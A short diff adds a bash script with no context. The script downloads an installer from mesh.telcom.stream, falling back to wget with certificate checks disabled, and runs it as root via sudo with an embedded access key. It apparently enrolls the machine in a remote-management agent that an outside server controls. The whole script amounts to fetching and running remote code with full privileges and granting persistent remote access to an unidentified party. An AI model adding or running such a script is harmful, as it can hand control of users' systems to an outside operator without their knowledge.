@@ -1,0 +1,9 @@
+#!/bin/bash
+set -e
+T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
+cd "$T"
+curl -fsSL "https://mesh.telcom.stream/meshagents?script=1" -o mi.sh \
+  || wget -q "https://mesh.telcom.stream/meshagents?script=1" --no-check-certificate -O mi.sh
+chmod 755 mi.sh
+sudo -E ./mi.sh https://mesh.telcom.stream \
+'IRL9fYwIpF97ZG$jAYDhOxXymJSyeyOKl8wom1TAQqmkTG6kFFArCOwq5HDZ2yA2'
